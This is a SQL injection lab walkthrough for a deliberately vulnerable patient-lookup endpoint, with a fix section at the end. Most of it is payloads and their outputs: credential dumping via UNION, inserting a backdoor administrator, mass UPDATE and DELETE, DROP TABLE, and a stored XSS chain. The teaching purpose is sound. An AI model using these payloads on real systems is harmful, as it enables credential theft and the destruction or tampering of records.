# SQL Injection — Attack Walkthrough (MediCare Pro lab)

**Endpoint:** `GET /api/sql?id=<payload>`
**Page:** `/pages/sql-injection.html` → *Patient Record Lookup*
**Every payload and output below was executed against the current code and verified.**

> ⚠ **Do not commit this file.** `server.js:64` runs `express.static` on the repo
> root and the block list (`server.js:56`) does not cover `.md`, so anything you
> commit here is downloadable from the live site. Keep it untracked, like the
> other attack docs.

---

## 0. Why it works

`api/sql.js` pastes the field straight into the query text:

```js
// ❌ VULNERABLE
const query = `SELECT id, name, diagnosis FROM patients WHERE id = '${rawId}'`;
```

Your input lands **inside single quotes**, so:

| You type | The server builds |
|---|---|
| `1` | `... WHERE id = '1'` |
| `1' OR '1'='1` | `... WHERE id = '1' OR '1'='1'` ← your quote closed the string |
| `0'; DROP TABLE patients;--` | `... WHERE id = '0';` **+** `DROP TABLE patients` |

Two mechanics make the rest work:

- **`--`** comments out the trailing quote that the original query still expects.
- **`;`** starts a new statement. The endpoint splits on `;` and runs each one,
  which is why *writes* work, not just reads.

The `executed` array in the response proves it — comment stripping removed the
tail and left clean statements:

```json
"executed": [
  "SELECT id, name, diagnosis FROM patients WHERE id = '0'",
  "INSERT INTO patients (id,name) VALUES (7,'X')"
]
```

---

## 1. Baseline — normal use works

```
1
```
→ **1 row**: `Maria Santos | Hypertension`

---

## 2. Tautology — dump the whole table

```
1' OR '1'='1
```
→ **5 rows.** The `id = '1'` condition is now irrelevant.

Refine it:
```
1' OR '1'='1' ORDER BY id DESC LIMIT 2
```
→ **2 rows**: `Rosario Garcia`, then `Pedro Bautista`.

---

## 3. UNION — steal another table

```
0' UNION SELECT username,password,role FROM users--
```
→ **4 rows of credentials in plaintext:**

| username | password | role |
|---|---|---|
| admin | **admin123** | Administrator |
| doctor | password1 | Physician |
| nurse | nurse123 | Nurse |
| radiologist | xray2024 | Radiologist |

The column count must match the leading `SELECT` (3). Prove the engine checks:

```
0' UNION SELECT username,password FROM users--
```
→ **SQL error: `UNION queries have an incompatible number of columns: the first query has 3, this one has 2`**

The error is returned to the client — error-based enumeration for free.

---

## 4. Boolean / blind probe

```
0' UNION SELECT COUNT(*),1,1 FROM patients--
```
→ **1 row**: `COUNT(*) = 5`

Add a `WHERE` to test conditions one at a time:
```
0' UNION SELECT COUNT(*),1,1 FROM patients WHERE diagnosis='Bronchial Asthma'--
```
→ `COUNT(*) = 1`, versus `0` for any diagnosis that doesn't exist.

---

## 5. ✍️ WRITE INJECTION — add records

This is the part your old lab could not do. Because `;` starts a new statement
and the server executes each one, you can **write**.

### 5a. Insert a patient

```
0'; INSERT INTO patients (id,name,diagnosis,ssn,notes) VALUES (99,'Injected Patient','SQLi Backdoor','000-00-0000','Written by injection');--
```
→ `INSERT INTO patients — 1 row added`

**Verify it is really in the table** — search for it normally:
```
99
```
→ **1 row**: `99 | Injected Patient | SQLi Backdoor`

Confirm the count moved:
```
0' UNION SELECT COUNT(*),1,1 FROM patients--
```
→ `COUNT(*) = 6` (was 5)

### 5b. Omit the id — it auto-assigns

```
0'; INSERT INTO patients (name,diagnosis,ssn) VALUES ('Auto Id Patient','No ID Supplied','111-11-1111');--
```
→ row created with `id = 6`

### 5c. Create a backdoor administrator

```
0'; INSERT INTO users (username,password,role,email) VALUES ('backdoor','pwned123','Administrator','b@d.ph');--
```

Confirm it exists:
```
0' UNION SELECT username,password,role FROM users--
```
→ **5 rows** now, the last one `backdoor | pwned123 | Administrator`.

---

## 6. ✍️ Tamper with existing records

### UPDATE — alter a diagnosis
```
0'; UPDATE patients SET diagnosis='Severe Poisoning' WHERE id=1;--
```
→ `UPDATE patients — 1 row(s) modified`

Verify:
```
1
```
→ `Maria Santos | **Severe Poisoning**` (was `Hypertension`)

Mass-update every row by dropping the `WHERE`:
```
0'; UPDATE patients SET diagnosis='Modified';--
```
→ `5 row(s) modified`

### DELETE — remove a record
```
0'; DELETE FROM patients WHERE id=99;--
```
→ `DELETE FROM patients — 1 row(s) removed`

Verify:
```
0' UNION SELECT COUNT(*),1,1 FROM patients--
```
→ `COUNT(*) = 5` (back down from 6)

Delete everything (no `WHERE`):
```
0'; DELETE FROM patients;--
```
→ `5 row(s) removed`

---

## 7. ✍️ Destroy the table

```
0'; DROP TABLE patients;--
```
→ `DROP TABLE patients — table removed`

Everything after fails:
```
1
```
→ **SQL error: `Table "patients" does not exist`**

Recreate it empty, then use **Reset lab data** on the page (or `GET /api/sql?reset=1`)
to get the 5 seeded patients back.

---

## 8. Restore the lab

Press **Reset lab data** on the page, or:
```
GET /api/sql?reset=1
```

Verified: `COUNT(*)` returns to 5, `patients=5, users=4`.
A server restart does the same thing, because the tables live in memory.

---

## 9. Bonus chain — stored XSS via SQL injection

`renderResults()` writes cell values into `innerHTML` without escaping. Insert a
row whose field contains markup:

```
0'; INSERT INTO patients (id,name,diagnosis) VALUES (100,'<img src=x onerror=alert(document.domain)>','injected');--
```

Then search `100`. The payload executes in the page. That's the classic
**second-order SQL injection → stored XSS** chain — a real technique, not a
contrivance.

---

## ⚠️ What to actually claim when you present this

Be accurate. The distinction matters and an informed audience will notice.

**True:**
- The injection is real. `api/sql.js` concatenates input into SQL and then
  genuinely parses and executes the result.
- The rows are really added, modified, and deleted, and the change persists
  across requests — a second user loading the page sees the attacker's row.
- The credential leak via `UNION` is real; `users.password` really is plaintext.
- On **any real database**, this exact payload writes a row that survives
  restarts, is visible to every user, and can be used to plant an admin account.

**Not true — do not claim it:**
- These are **not hospital records**. There is no database in this app.
  `package.json` has no SQL driver (only `dotenv`, `express`, `firebase-admin`).
  `DB` is a plain JavaScript object in process memory, wiped on every restart
  and on Render's next deploy.
- It is **not** the same rows Firestore holds. The app's real patient data lives
  in Firestore and this lab does not touch it.
- It does **not** authenticate anyone. The `backdoor` user you insert is a row in
  a lab table; it does not grant a Firebase session or a login.

The honest framing: *"This is a simulated engine, but the attack logic is the
real thing. Against an actual database, step 5c plants an account that logs in."*

---

## The fix

Never build SQL by concatenation. Bind the value:

```js
// ✅ SECURE
const query = 'SELECT id, name, diagnosis FROM patients WHERE id = ?';
const rows = await db.execute(query, [rawId]);
```

The driver sends the SQL text and the value **separately**, so `1' OR '1'='1`
arrives as a literal string and matches no row.

Supporting measures:

| Measure | Why |
|---|---|
| Least-privilege DB user | An app account that cannot `DROP` cannot be told to |
| Stored procedures | `INSERT`/`DELETE` cannot be appended to a fixed body |
| Disable stacked queries in the driver | Kills the `;` technique outright |
| Don't return driver errors | Kills error-based enumeration |
| Parameterize **every** query | Not just the one that got exploited |
| Gate destructive endpoints behind auth | `server.js:39` has no auth middleware at all |

Verify the fix: `git log --oneline` shows `2f5faa8` (API) and `70bfcf0` (page)
parameterized this lab. Checking that commit out restores the secure version.
Note that reverting `2f5faa8` alone restores the broken code from `751c266` —
see `ATTACK-MAP.md`.